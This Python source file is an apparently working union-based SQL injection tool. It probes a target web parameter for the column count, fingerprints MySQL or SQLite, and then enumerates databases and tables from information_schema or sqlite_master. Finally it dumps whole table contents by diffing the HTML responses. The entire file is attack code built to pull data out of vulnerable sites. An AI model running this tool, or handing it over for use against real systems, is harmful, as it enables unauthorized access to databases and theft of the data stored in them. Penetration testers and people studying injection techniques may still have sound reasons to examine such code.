import sys
import bs4
from utils import perform_requests, diff_html


def send_payload_n_compare(base_url, vector, attack, param, query, number_of_column, old_html, result, method):
    for nbr in range(number_of_column - 1):
        param.append("NULL")
    payload = craft_union_payload(vector, attack, param, query, method)
    r = perform_requests(base_url, payload, method)
    new_html = r.text.splitlines(keepends=True)
    diff_html(old_html, new_html, result)


def detect_number_of_columns(base_url, vector, attack, method):
    result_nbr = 1
    while True:
        if method == "GET":
            payload = '?' + vector + '=foo' + attack + " UNION SElECT NULL"
            for nbr in range(result_nbr - 1):
                payload += ', NULL'
            payload += '-- '
            r = perform_requests(base_url, payload, method)
        else:
            payload = {vector: 'foo' + attack + " UNION SELECT NULL"}
            for nbr in range(result_nbr - 1):
                payload[vector] += ', NULL'
            payload[vector] += '-- '
            r = perform_requests(base_url, payload, method)
        if "The used SELECT statements have a different number of columns" in r.text:
            result_nbr += 1
            continue
        return result_nbr


def craft_union_payload(vector, attack, param, ending, method):
    if method == "GET":
        payload = f"?{vector}=foo{attack} UNION SELECT {param[0]}"
        for nbr in range(len(param)):
            if nbr == 0:
                continue
            payload += f", {param[nbr]}"
        payload += ' ' + ending
        return payload
    payload = {vector: f"foo{attack} UNION SELECT {param[0]}"}
    for nbr in range(len(param)):
        if nbr == 0:
            continue
        payload[vector] += f", {param[nbr]}"
    payload[vector] += ' ' + ending
    return payload


def print_version_db(base_url, vector, attack, number_of_column, old_html, result, db_test, method):
    if db_test == "mysql":
        param = ["version()"]
    else:
        param = ["sqlite_version()"]
    send_payload_n_compare(base_url, vector, attack, param, "-- ", number_of_column, old_html, result, method)


def ask_user_db():
    database = 'undefined'
    user_input = input("Whats DB is this ? Type mysql(mariadb) or sqlite: ")
    if user_input.find("mysql") != -1:
        database = 'mysql'
    if user_input.find("sqlite") != -1:
        database = 'sqlite'
    return database


def dump_all_databases_name(base_url, vector, attack, number_of_column, old_html, result, db_engine, method):
    param = []
    if db_engine == "mysql":
        param.append("schema_name")
        query = "FROM information_schema.schemata -- "
    elif db_engine == "sqlite":
        param.append("name")
        query = "FROM sqlite_master WHERE type='table'-- "
    else:
        print("LOG: Unsupported database engine type")
        sys.exit(42)
    send_payload_n_compare(base_url, vector, attack, param, query, number_of_column, old_html, result, method)


def dump_all_table_db(base_url, vector, attack, number_of_column, old_html, result, database, db_engine, method):
    param = []
    query = ''
    if db_engine == "mysql":
        param.append("table_name")
        query = f"FROM information_schema.tables WHERE table_schema = '{database}"
    elif db_engine == "sqlite":
        param.append("name")
        query = "FROM sqlite_master WHERE type='table"
    send_payload_n_compare(base_url, vector, attack, param, query, number_of_column, old_html, result, method)


def dump_all_content_table(base_url, vector, attack, old_html, result, database, db_engine, table, method):
    param = []
    query = ''
    if db_engine == "mysql":
        query = f"FROM {database}.{table}-- "
    elif db_engine == "sqlite":
        query = f"FROM {table}-- "
    param.append("*")
    while True:
        payload = craft_union_payload(vector, attack, param, query, method)
        r = perform_requests(base_url, payload, method)
        if "The used SELECT statements have a different number of columns" in r.text:
            param.append("NULL")
            continue
        new_html = r.text.splitlines(keepends=True)
        diff_html(old_html, new_html, result)
        break


def union_based_inject(base_url, vector, attack, result, method):
    r = perform_requests(base_url, '', method)
    old_html = r.text.splitlines(keepends=True)

    number_of_column = detect_number_of_columns(base_url, vector, attack, method)
    print("LOG: Checking if its a sqlite database")
    print_version_db(base_url, vector, attack, number_of_column, old_html, result, 'sqlite', method)
    print("LOG: Checking if its a mysql database")
    print_version_db(base_url, vector, attack, number_of_column, old_html, result, 'mysql', method)
    print("LOG: Asking user for database engine type")
    db_engine = ask_user_db()
    if db_engine == 'undefined':
        print("Cant handle this db_engine type")
        return
    print("LOG: Dumping all name of database")
    dump_all_databases_name(base_url, vector, attack, number_of_column, old_html, result, db_engine, method)
    print("LOG: Asking user for database name")
    uinput = input("Please input all database name show separated by a comma: ")
    if uinput == '':
        print("LOG: Aborting...")
        return
    db_names = uinput.split(',')
    print(f"LOG: Analyzing these database: {db_names}")
    for database in db_names:
        dump_all_table_db(base_url, vector, attack, number_of_column, old_html, result, database, db_engine, method)
        print("LOG: Asking user for tables names")
        uinput = input("Please input all tables name separated by a comma: ")
        if uinput == '':
            print("LOG: Skipping current table")
            return
        for table in uinput.split(','):
            dump_all_content_table(base_url, vector, attack, old_html, result, database, db_engine, table, method)
